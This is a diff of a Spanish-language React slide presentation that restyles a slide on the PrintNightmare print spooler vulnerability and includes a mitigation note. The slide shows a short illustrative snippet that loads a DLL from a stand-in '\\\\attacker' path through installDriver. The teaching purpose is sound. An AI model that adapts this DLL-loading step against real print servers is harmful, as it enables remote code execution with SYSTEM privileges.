@@ -1206,94 +1206,192 @@ export default function App() {
 
         {/* ── CASO DE SEGURIDAD ── */}
         <Slide>
-          <div style={{ padding: "0 8%" }}>
-            <div className="grid-2">
-              <div style={{ textAlign: "left" }}>
-                <span
-                  className="presenter-tag"
-                  style={{
-                    background: "rgba(203, 124, 148, 0.1)",
-                    color: "var(--accent-red)",
-                    borderColor: "rgba(203, 124, 148, 0.3)",
-                  }}
-                >
-                  AUDITORÍA DE SEGURIDAD // CVE-2021-34527
-                </span>
-                <h2 style={{ fontSize: "5rem", margin: "1rem 0 2.5rem 0" }}>
-                  PrintNightmare
-                </h2>
+          <div
+            style={{
+              padding: "0 5%", // Reducido el padding lateral para ganar espacio horizontal
+              height: "100%",
+              display: "flex",
+              flexDirection: "column",
+              justifyContent: "center",
+            }}
+          >
+            <div
+              className="grid-2"
+              style={{
+                gap: "6rem", // Reducido de 10rem a 6rem para evitar el desplazamiento excesivo a la derecha
+                alignItems: "center",
+                maxWidth: "1800px", // Ancho máximo para mantenerlo centrado
+                margin: "0 auto", // Centra el contenedor de la grilla en la diapositiva
+              }}
+            >
+              {/* Columna Izquierda: Teoría */}
+              <div
+                style={{
+                  textAlign: "left",
+                  display: "flex",
+                  flexDirection: "column",
+                  gap: "2.5rem",
+                  width: "100%", // Asegura que ocupe su espacio en la grilla
+                }}
+              >
+                <div>
+                  <span
+                    className="presenter-tag"
+                    style={{
+                      background: "rgba(203, 124, 148, 0.1)",
+                      color: "var(--accent-red)",
+                      borderColor: "rgba(203, 124, 148, 0.3)",
+                      marginBottom: "1.5rem",
+                    }}
+                  >
+                    AUDITORÍA // CVE-2021-34527
+                  </span>
+                  <h2
+                    style={{
+                      fontSize: "6rem",
+                      margin: 0,
+                      lineHeight: "1",
+                      letterSpacing: "-0.02em",
+                    }}
+                  >
+                    PrintNightmare
+                  </h2>
+                </div>
+
                 <div
                   className="glass-card"
-                  style={{ borderColor: "rgba(203, 124, 148, 0.3)" }}
+                  style={{
+                    borderColor: "rgba(203, 124, 148, 0.3)",
+                    padding: "3.5rem",
+                    position: "relative",
+                    overflow: "hidden",
+                  }}
                 >
-                  <p
-                    style={{
-                      fontSize: "2.2rem !important",
-                      color: "var(--fg)",
-                    }}
-                  >
-                    Los servicios de Spooler legados ejecutándose como{" "}
-                    <code>SYSTEM</code> permitieron la Ejecución Remota de
-                    Código mediante la inyección de DLLs arbitrarias.
-                  </p>
                   <div
                     style={{
-                      marginTop: "2rem",
-                      display: "flex",
-                      alignItems: "center",
-                      gap: "1rem",
-                      color: "var(--accent-red)",
+                      position: "absolute",
+                      top: "-20px",
+                      right: "-20px",
+                      opacity: 0.05,
+                      pointerEvents: "none",
                     }}
                   >
-                    <ShieldAlert size={24} />
-                    <span style={{ fontWeight: 700 }}>
-                      Vector de Escalamiento de Privilegios
-                    </span>
+                    <ShieldAlert size={250} color="var(--accent-red)" />
                   </div>
+                  <p
+                    style={{
+                      fontSize: "2.5rem !important",
+                      color: "var(--fg)",
+                      lineHeight: "1.4",
+                      margin: 0,
+                      position: "relative",
+                      zIndex: 1,
+                    }}
+                  >
+                    Los servicios de Spooler legados permitieron la{" "}
+                    <strong>Ejecución Remota de Código</strong> mediante la
+                    inyección de DLLs arbitrarias con privilegios{" "}
+                    <code>SYSTEM</code>.
+                  </p>
+                </div>
+
+                <div
+                  style={{
+                    display: "flex",
+                    alignItems: "center",
+                    gap: "1.5rem",
+                    color: "var(--accent-red)",
+                    background: "rgba(203, 124, 148, 0.1)",
+                    padding: "2rem",
+                    borderRadius: "20px",
+                    border: "1px solid rgba(203, 124, 148, 0.2)",
+                  }}
+                >
+                  <ShieldAlert size={40} />
+                  <span
+                    style={{
+                      fontWeight: 800,
+                      fontSize: "2rem",
+                      letterSpacing: "0.05em",
+                    }}
+                  >
+                    FALLO CRÍTICO DE ARQUITECTURA
+                  </span>
                 </div>
               </div>
 
-              <div style={{ position: "relative" }}>
-                <Code
-                  language="javascript"
-                  lineNumbers="1|3-5"
+              {/* Columna Derecha: Código y Mitigación */}
+              <div
+                style={{
+                  display: "flex",
+                  flexDirection: "column",
+                  gap: "3rem",
+                  width: "100%",
+                }}
+              >
+                <div
                   style={{
-                    fontSize: "1.4rem",
                     borderRadius: "24px",
-                    padding: "2rem",
-                    boxShadow: "0 30px 60px rgba(0,0,0,0.5)",
+                    overflow: "hidden",
+                    boxShadow: "0 50px 100px rgba(0,0,0,0.7)",
+                    border: "1px solid var(--line)",
                   }}
                 >
-                  {`// Ataque RpcAddPrinterDriverEx
-// Escalando a privilegios SYSTEM
-const maliciousPath = "\\\\\\\\attacker\\\\exploit.dll";
+                  <Code
+                    language="javascript"
+                    lineNumbers="1|3-5|7"
+                    style={{
+                      fontSize: "1.7rem",
+                      padding: "2.5rem",
+                      margin: 0,
+                    }}
+                  >
+                    {`// Ataque RpcAddPrinterDriverEx
+const evilDLL = "\\\\\\\\attacker\\\\exploit.dll";
 
-// Disparando la vulnerabilidad del Spooler
-installDriver(maliciousPath); 
+// Inyección en el Spooler persistente
+installDriver(evilDLL); 
 
-// Resultado: Compromiso Total del Kernel`}
-                </Code>
+// Resultado: Compromiso Total`}
+                  </Code>
+                </div>
 
-                <div
+                <motion.div
+                  initial={{ opacity: 0, scale: 0.95 }}
+                  whileInView={{ opacity: 1, scale: 1 }}
                   className="technical-note"
                   style={{
-                    marginTop: "2.5rem",
+                    margin: 0,
                     borderColor: "var(--accent-red)",
+                    background: "rgba(255, 255, 255, 0.03)",
+                    padding: "2.5rem",
+                    borderRadius: "24px",
+                    borderLeftWidth: "12px",
                   }}
                 >
                   <h4
                     style={{
-                      fontSize: "1.8rem !important",
+                      fontSize: "2.2rem !important",
                       color: "var(--fg)",
+                      marginBottom: "1rem",
+                      display: "flex",
+                      alignItems: "center",
+                      gap: "1rem",
                     }}
                   >
-                    Principio de Mitigación
+                    <ArrowRight color="var(--accent-red)" /> Mitigación
                   </h4>
-                  <p style={{ fontSize: "1.6rem !important" }}>
-                    Transición hacia el <strong>Aislamiento de Procesos</strong>{" "}
-                    y el Principio de Menor Privilegio.
+                  <p
+                    style={{
+                      fontSize: "2rem !important",
+                      margin: 0,
+                      lineHeight: "1.4",
+                    }}
+                  >
+                    Aislamiento de procesos y <strong>Sandboxing</strong> de
+                    colas de impresión.
                   </p>
-                </div>
+                </motion.div>
               </div>
             </div>
           </div>
